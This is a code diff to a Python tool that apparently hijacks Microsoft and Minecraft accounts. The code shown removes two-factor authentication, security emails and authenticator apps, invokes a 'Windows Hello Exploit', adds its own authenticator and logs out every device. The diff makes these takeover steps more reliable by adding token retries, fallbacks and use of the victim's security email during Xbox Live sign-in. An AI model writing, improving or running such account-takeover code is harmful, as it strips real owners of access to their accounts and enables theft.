@@ -126,9 +126,12 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
     'ok' | 'no_java' | 'no_mc' | 'transient'
     """
     print("[~] - Checking Minecraft Account (XBL via direct connection)")
+    sec_email = (account_info.get("microsoft") or {}).get("security_email")
+    if sec_email in (None, "", "Couldn't Change!", "Unknown", "N/A"):
+        sec_email = None
     xbl_client = await _direct_xbl_client(session)
     try:
-        XBLResponse = await get_xbl(xbl_client)
+        XBLResponse = await get_xbl(xbl_client, security_email=sec_email)
     finally:
         await xbl_client.aclose()
 
@@ -215,7 +218,11 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         raise
 
     apicanary = await get_cookies(session)
+    if not apicanary:
+        print("[!] - No apiCanary from password/reset — will retry later for SA ops")
+        log.warning("get_cookies returned no apiCanary — continuing into MC check")
 
+    t = None
     try:
         t = await get_t(session)
         if t:
@@ -231,6 +238,7 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     # Minecraft checking — retry when XBL/SSID fail (rate limit / parse race).
     # Never label transient failures as "No Minecraft" — that was a false negative
     # when VaultProxies killed sisu.xboxlive.com connections.
+    # CatB overprotective during sisu is completed via security-email OTP.
     mc_attempts = 6
     for attempt in range(1, mc_attempts + 1):
         outcome = await _check_minecraft(session, account_info)
@@ -254,6 +262,12 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                 account_info.get("microsoft", {}).get("email"),
                 account_info["minecraft"].get("gamertag"),
             )
+
+    # Refresh canary after MC / SSO elevation (password/reset may work now)
+    if not apicanary:
+        apicanary = await get_cookies(session)
+        if apicanary:
+            print("[+] - Got apiCanary after MC check")
 
     # Gets account info via microsofts API
     subscriptions = await get_subscriptions(session, verification_tokens["home"])
@@ -304,11 +318,16 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         "commercial": subscriptions.get("commercial") or [],
     }
     
-    await get_amrp(session, t)
-    print(f"[+] - Got AMRP")
+    await get_amrp(session, t) if t else None
+    if t:
+        print(f"[+] - Got AMRP")
 
     # 2FA
-    await remove_2fa(session, apicanary)
+    if apicanary:
+        await remove_2fa(session, apicanary)
+    else:
+        print("[!] - Skipping remove_2fa (no apiCanary)")
+        log.warning("skipping remove_2fa — no apiCanary")
 
     ms = account_info.get("microsoft") or {}
     existing_recovery = ms.get("recovery_code")
@@ -409,11 +428,13 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     if not minecon:
 
         # Pass Keys / Windows Hello Exploit
-        await remove_zyger(session, apicanary)
-
-        # Removes security_emails / Auth Apps
-        await remove_proof(session, apicanary)
-        print("[+] - Removed all Proofs")
+        if apicanary:
+            await remove_zyger(session, apicanary)
+            # Removes security_emails / Auth Apps
+            await remove_proof(session, apicanary)
+            print("[+] - Removed all Proofs")
+        else:
+            print("[!] - Skipping remove_zyger/remove_proof (no apiCanary)")
 
         # Third Party Launchers (Minecraft, Prism)
         await remove_services(session)
@@ -491,7 +512,10 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
             print(f"[+] - Added Authenticator ({auth})")
 
         # Logout all devices
-        await logout_all(session, apicanary)
+        if apicanary:
+            await logout_all(session, apicanary)
+        else:
+            print("[!] - Skipping logout_all (no apiCanary)")
         
     print("[+] - Account has been secured")
     return account_info
